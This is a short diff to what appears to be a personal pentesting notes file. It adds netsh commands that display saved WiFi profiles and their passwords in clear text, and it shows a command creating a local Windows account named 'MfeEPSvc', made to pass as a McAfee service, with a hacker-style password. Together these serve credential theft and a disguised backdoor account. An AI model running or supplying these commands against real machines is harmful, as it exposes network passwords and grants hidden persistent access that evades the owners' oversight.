@@ -1,6 +1,11 @@
 # notes 
+### @popopret with the wifi hax
 
-### mRr3b00t does the basics and I add some
+````
+netsh wlan show profile
+netsh wlan show profile "<WiFi_Profile_Name>" key=clear
+````
+### @mRr3b00t does the basics and I add some
 
 ````
 net user /add MfeEPSvc h4x0r0p53c!
